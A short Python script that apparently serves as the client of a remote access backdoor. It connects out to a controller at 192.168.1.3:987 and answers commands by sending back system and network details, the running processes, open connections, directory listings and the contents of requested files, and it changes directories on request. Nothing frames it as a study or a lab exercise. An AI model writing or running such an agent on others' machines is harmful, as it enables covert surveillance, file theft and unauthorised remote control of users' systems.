import os
import sys
import psutil
import platform
from socket import *

def sendfile(filename, socket):
    f = open(str(filename), 'rb')
    print('file opened')
    fd = f.read()
    print('file read')
    f.close()
    print('file closed')
    socket.send(fd)
    print('file sent')

s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
ep = ('192.168.1.3', 987)
s.connect(ep)
message = s.recv(2000)
msg = bytes(message).decode('ascii')

while str(msg) != 'exit':
    try:
        if msg == 'ip':
            res = str(psutil.net_if_addrs())
            s.send(res.encode('ascii'))
        elif msg == 'sys':
            res = str(platform.uname())
            s.send(res.encode('ascii'))
        elif msg == 'pwd':
            res = str(os.getcwd())
            s.send(res.encode('ascii'))
        elif msg == 'ps':
            ress = psutil.pids()
            rs = []
            for rr in ress:
                r = psutil.Process(rr)
                pid = r.pid
                name = r.name()
                cpu = r.cpu_percent()
                mem = r.memory_percent()
                res = 'pid : ' + str(pid) + ' name : ' + str(name) + ' cpu : ' + str(cpu) + ' mem : ' + str(mem)
                rs.append(res)
            s.send(str(rs).encode('ascii'))
            rs.clear()
        elif msg == 'connections':
            res = psutil.net_connections()
            rs = []
            for r in res:
               rs.append(str(r.raddr))
            s.send(str(rs).encode('ascii'))
            rs.clear()
        elif msg.startswith('get'):
            fn = msg.replace('get ', '')
            fl = os.listdir(os.getcwd())
            for f in fl:
                if fn == f:
                    ff = open(str(fn), 'rb')
                    fd = ff.read()
                    ff.close()
                    s.send(fd)
                    break
        elif msg == 'ls':
            fl = os.listdir(os.getcwd())
            s.send(str(fl).encode('ascii'))
        elif msg == 'pwd':
            r = os.getcwd()
            s.send(r.encode('ascii'))
        elif msg.startswith('cd'):
            fn = msg.replace('cd ', '')
            os.chdir(fn)
            s.send(str('file changed !').encode('ascii'))
                
        message = s.recv(2000)
        msg = bytes(message).decode('ascii')
    except Exception as e:
        print('the problem is : ' + str(e))
        sys.exit(0)

sys.exit(0)
